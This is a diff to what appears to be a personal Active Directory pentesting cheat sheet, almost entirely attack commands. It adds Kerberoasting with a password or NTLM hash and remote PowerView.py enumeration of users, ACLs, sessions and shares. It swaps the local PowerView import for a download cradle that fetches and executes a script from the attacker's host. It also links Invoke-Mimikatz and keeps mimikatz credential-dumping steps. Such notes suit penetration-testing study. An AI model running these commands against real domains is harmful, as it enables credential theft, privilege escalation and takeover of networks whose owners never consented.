@@ -6,7 +6,8 @@
 
 ```bash
 # Kerberoast
-impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER
+impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER:$PASS
+impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER -hashes ':$NTLM'
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 
 # AS-REP roast
@@ -14,15 +15,61 @@ impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$U
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 ```
 
-### Local Commands
+With valid credentials for a domain user, we can first enumerate the domain remotely with [PowerView.py](https://github.com/aniqfakhrul/powerview.py)
 
-First, run **[BloodHound](0%20Tools/BloodHound.md)**
+```bash
+# Connect
+powerview --dc-ip $IP $DOMAIN/$USER:$PASS@$IP
+powerview --dc-ip $IP $DOMAIN/$USER@$IP -H ':$NTLM'
+
+# Identify DC
+Get-NetDomain
+
+# Enumerate user objects
+Get-NetUser -Select samaccountname
+Get-NetUser -Properties samaccountname,description,memberof
+Get-NetUser $USER
+
+# Enumerate group objects
+Get-NetGroup -Properties cn,member
+Get-NetGroup $GROUP
+Get-NetGroup -UserName 
+
+# Enumerate Computer objects
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+
+# Find hosts on the local domain where the current user has local administrator access
+Find-LocalAdminAccess
+
+# Check for logged-in users
+Get-NetSession -ComputerName $COMPUTER
+
+# Enumerate SPNs linked to users
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+# Retrieve the ACL for the specified object
+Get-ObjectAcl -Identity $OBJECT | select SecurityIdentifier,ActiveDirectoryRights
+Convert-SidToName $SID
+"$SID","$SID" | Convert-SidToName
+
+# Check if any users have "GenericAll" over a specified object
+Get-ObjectAcl -Identity $OBJECT | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+# Enumerate domain shares
+Find-DomainShare
+Find-DomainShare -CheckShareAccess # Takes a long time
+ls \\$COMPUTERNAME\$SHARE\$DOMAIN\
+```
+
+### Local Access
+
+Once we have local access, we can run **[BloodHound](0%20Tools/BloodHound.md)**
 
 **PowerView**
 
 ```powershell
 # Import PowerView
-. .\PowerView.ps1
+iex(new-object net.webclient).downloadstring("http://$OUR_IP/PowerView.ps1")
 
 # Idenfity DC (check Pdc)
 Get-NetDomain
@@ -84,8 +131,10 @@ net group "Enterprise Admins" mojo /add /domain
 
 **[Mimikatz](0%20Tools/Local/Mimikatz.md)**
 
+[Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
+
 ```bash
-# Grab credentials with mimikatz
+# mimikatz.exe
 .\mimikatz.exe
 privilege::debug
 token::elevate
@@ -95,6 +144,8 @@ lsadump::sam
 lsadump::secrets
 token::revert
 exit
+
+# 
 ```
 
 **[gpp-decrypt](0%20Tools/gpp-decrypt.md)**
